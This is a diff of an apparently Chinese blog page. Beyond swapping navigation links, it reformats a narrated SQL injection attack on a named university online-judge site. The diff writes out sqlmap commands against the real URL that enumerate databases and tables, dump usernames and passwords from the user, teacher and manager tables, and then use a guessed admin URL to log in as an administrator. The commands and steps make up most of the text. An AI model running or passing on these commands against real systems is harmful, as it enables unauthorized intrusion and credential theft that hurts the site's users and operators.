@@ -157,7 +157,7 @@
 
                         
                         <li>
-                            <a href="/about/">About</a>
+                            <a href="/tags/">Tags</a>
                         </li>
                         
                     
@@ -171,7 +171,7 @@
 
                         
                         <li>
-                            <a href="/tags/">Tags</a>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
@@ -232,12 +232,11 @@
 <p>对其进行注入并读取出网站的各个数据库名称：</p>
 <p><img src="%E5%9B%BE%E7%89%872.png" alt=""></p>
 <p>得出网站由三个数据库组成：acm、eoj、information_schema</p>
-<p>执行命令：&quot;./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm–tables&quot;曝出acm数据库里所有的表名：</p>
+<p>执行命令：<code>./sqlmap.py -u &quot;http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2&quot; -D acm–tables</code> 曝出acm数据库里所有的表名：</p>
 <p><img src="%E5%9B%BE%E7%89%873.png" alt=""></p>
-<p>同理分别执行命令&quot;./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>”<br>
--D eoj –tables”和“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D information_schema –tables&quot;曝出eoj数据库和information_schema数据库的表名称：</p>
+<p>同理分别执行命令 <code>./sqlmap.py -u &quot;http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2&quot; -D eoj –tables</code> 和 <code>./sqlmap.py -u &quot;http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2&quot; -D information_schema –tables</code> 曝出eoj数据库和information_schema数据库的表名称：</p>
 <p><img src="%E5%9B%BE%E7%89%874.png" alt=""> <img src="%E5%9B%BE%E7%89%875.png" alt=""></p>
-<p>继续深入挖掘数据库表的schema，尝试获取acm数据库里的各张表的schema，分别执行命令“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T user --columns”(其中把-T 后的命令项分别改为其他的表名就可尝试获取对应表的Schema,获取到：</p>
+<p>继续深入挖掘数据库表的schema，尝试获取acm数据库里的各张表的schema，分别执行命令<code>./sqlmap.py -u &quot;http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2&quot; -D acm –T user --columns</code> (其中把-T 后的命令项分别改为其他的表名就可尝试获取对应表的Schema,获取到：</p>
 <p>user表的schema：</p>
 <p><img src="%E5%9B%BE%E7%89%876.png" alt=""></p>
 <p>user_group表的schema:</p>
@@ -248,7 +247,7 @@
 <p><img src="%E5%9B%BE%E7%89%879.png" alt=""></p>
 <p>manage表的schema：</p>
 <p><img src="%E5%9B%BE%E7%89%8710.png" alt=""></p>
-<p>尝试获取一位用户的用户名和密码，尝试dump user表里的“id，name，password”，执行命令：“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T user –C “id,name,password” –-start 1 –-stop 1 --dump”</p>
+<p>尝试获取一位用户的用户名和密码，尝试dump user表里的“id，name，password”，执行命令：<code>./sqlmap.py -u &quot;http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2&quot; -D acm –T user –C “id,name,password” –-start 1 –-stop 1 --dump</code></p>
 <p>成功获取到一位用户的账户名和密码：</p>
 <p><img src="%E5%9B%BE%E7%89%8711.png" alt=""></p>
 <p><img src="%E5%9B%BE%E7%89%8712.png" alt=""></p>
@@ -259,13 +258,13 @@
 <p>可以查看该用户以往所有提交过的代码：</p>
 <p><img src="%E5%9B%BE%E7%89%8715.png" alt=""></p>
 <p><strong>注：事实上虽然这一个账号是在user表里被获取出来的而不是从teacher表或manager表中获取出来的，但由于在dump的时候读取的是存在表中的第一个条目，因此这一账号很可能是网站建设初始阶段的管理员身份的账号，事实上这个账号确实不是普通的账号，是拥有极高权限的管理员账号，这一点在后面的dump manager表出来的数据可以印证这一点。</strong></p>
-<p>下面执行命令：“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T teacher –C “name,password” --dump”</p>
-<p>和 “./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T manager –C “user,password,viewcode_priv”–dump”</p>
+<p>下面执行命令：<code>./sqlmap.py -u &quot;http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2&quot; -D acm –T teacher –C “name,password” --dump</code></p>
+<p>和 <code>./sqlmap.py -u &quot;http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2&quot; -D acm –T manager –C “user,password,viewcode_priv”--dump</code></p>
 <p>分别获取teacher表和manager表中的用户名和密码等条目：</p>
 <p><img src="%E5%9B%BE%E7%89%8716.png" alt=""></p>
 <p><img src="%E5%9B%BE%E7%89%8717.png" alt=""></p>
-<p>正如之前所提到的，用户”lcftc”在manager中存在，且拥有查阅他人代码的权限。</p>
-<p>简单尝试了几个后台的登录域名，猜中域名“<a href="http://acm.cs.ecnu.edu.cn/manage/managelogin.php%E2%80%9D" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/manage/managelogin.php”</a> 为平台的后台登录界面：</p>
+<p>正如之前所提到的，用户lcftc在manager中存在，且拥有查阅他人代码的权限。</p>
+<p>简单尝试了几个后台的登录域名，猜中域名 <a href="http://acm.cs.ecnu.edu.cn/manage/managelogin.php" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/manage/managelogin.php</a> 为平台的后台登录界面：</p>
 <p><img src="%E5%9B%BE%E7%89%8718.png" alt=""></p>
 <p>利用先前获取的lcftc用户的密码进行登录，成功进入后台管理界面：</p>
 <p><img src="%E5%9B%BE%E7%89%8719.png" alt=""></p>
